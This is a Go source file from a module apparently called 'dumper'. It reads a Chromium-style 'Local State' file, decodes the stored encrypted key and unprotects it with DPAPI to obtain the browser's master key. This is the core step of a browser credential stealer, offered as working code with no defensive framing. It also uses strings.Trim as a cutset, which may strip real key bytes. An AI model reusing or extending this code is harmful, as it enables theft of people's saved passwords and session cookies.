package crypt

import (
	"encoding/base64"
	"encoding/json"
	"strings"

	"dumper/file"
)

type LocalState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func GetMasterKey(localStatePath string) []byte {
	var localState LocalState

	err := json.Unmarshal(file.ReadData(localStatePath), &localState)
	if err != nil {
		panic(err)
	}

	encKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
	if err != nil {
		panic(err)
	}

	return cryptUnprotectData([]byte(strings.Trim(string(encKey), "DPAPI")))
}
